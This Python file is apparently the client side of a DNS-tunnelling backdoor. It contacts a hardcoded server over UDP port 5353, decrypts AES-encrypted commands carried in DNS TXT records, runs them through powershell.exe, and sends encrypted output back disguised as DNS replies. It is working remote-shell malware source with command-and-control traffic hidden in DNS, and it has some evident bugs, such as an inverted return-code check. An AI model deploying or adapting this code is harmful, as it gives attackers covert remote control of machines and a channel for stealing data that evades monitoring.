from asyncio import subprocess
import socket
import dns.name
import dns.message
import dns.query
from dnslib import DNSRecord, DNSHeader, RR
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from subprocess import PIPE, run, check_output, Popen
import time

class Payload:
    def __init__(self):
        pass

def payload(addr):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    grabIP = s.getsockname()[0]
    s.close()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,0)
    sock.bind((grabIP, 1234))
    query = dns.message.make_query("google.com", dns.rdatatype.TXT)
    dns.query.send_udp(sock, query, (addr,5353))
    while 1:
        packets = bytearray()
        commandFinished = False
        while not commandFinished:
            data,address = sock.recvfrom(512)
            dataList = list(data)
            newDataList = list()
            found = False
            count = 0
            for i in dataList:
                if i == 33:
                    found = True
                    count += 1
                    if count == 2:
                        break
                elif found:
                    newDataList.append(i)
            bytesNewDataList = bytearray(newDataList)
            #todo
            if bytesNewDataList.decode('utf-8') != 'end':
                packets.extend(bytesNewDataList)
            else:
                command = decrypting(packets, "hellothisismebob")
                command = command.decode('utf-8')
                command2 = ""
                for i in repr(command):
                    if i == "'":
                        continue
                    elif i == "\\":
                        break
                    else:
                        command2 += i
                commandFinished = True

        if len(command2.split()) == 1:
            try:
                result2 = check_output(['powershell.exe', '/c', command2]) #todo flag
                finalResult = encrypting(result2.decode("utf-8"), "hellothisismebob")
            except CalledProcessError as exec:
                finalResult = encrypting("An error occured when running: " + command2, "hellothisismebob")
        else:
            seperatedCommand = ['powershell.exe','/c'] #todo flag
            seperatedCommand += command2.split()
            result2 = run(seperatedCommand, stdout=PIPE, stderr=PIPE, universal_newlines=True)
            if result2.returncode == 0:
                finalResult = encrypting("An error occured when running: " + command2, "hellothisismebob")
            else:
                finalResult = encrypting(result2.stdout, "hellothisismebob")

        if len(finalResult) >= 250:
            finalResultSeperated = list()
            eachList = ""
            for char in range(len(finalResult)):
                if len(eachList) <= 249 and char != (len(finalResult) - 1):
                    eachList += finalResult[char]
                else:
                    eachList += finalResult[char]
                    finalResultSeperated.append(eachList)
                    eachList = ""
            for i in range(len(finalResultSeperated)):
                request = DNSRecord.parse(data)
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                reply.add_answer(*RR.fromZone("google.com TXT " + "!" + finalResultSeperated[i] + "!"))
                resp = reply.pack()
                sock.sendto(resp,(addr,5353))

            request = DNSRecord.parse(data)
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            reply.add_answer(*RR.fromZone("google.com TXT " + "!end!"))
            resp = reply.pack()
            sock.sendto(resp,(addr,5353))
                
        else:
            request = DNSRecord.parse(data)
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            reply.add_answer(*RR.fromZone("google.com TXT " + "!" + finalResult + "!"))
            resp = reply.pack()
            sock.sendto(resp,(addr,5353))
            request = DNSRecord.parse(data)
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            reply.add_answer(*RR.fromZone("google.com TXT " + "!end!"))
            resp = reply.pack()
            sock.sendto(resp,(addr,5353))


def encrypting(data,key):
    enc = bytes(key, "utf-8")
    data = data.encode("utf-8")
    length = 16 - (len(data) % 16)
    data += bytes([length])*length
    iv = b'\x9a\x95\xb9\xe9#c\xd9\xa5\x92CG\xf9)\x0e\xf5x'
    cipher = AES.new(enc, AES.MODE_CBC, iv)
    return str(base64.b64encode(cipher.encrypt(data)), 'utf-8')

def decrypting(enc,key):
    enc = base64.b64decode(enc)
    bl = bytes(key, "utf-8")
    iv = b'\x9a\x95\xb9\xe9#c\xd9\xa5\x92CG\xf9)\x0e\xf5x'
    cipher = AES.new(bl, AES.MODE_CBC, iv)
    return cipher.decrypt(enc)


payload("192.168.7.168") ### Address of server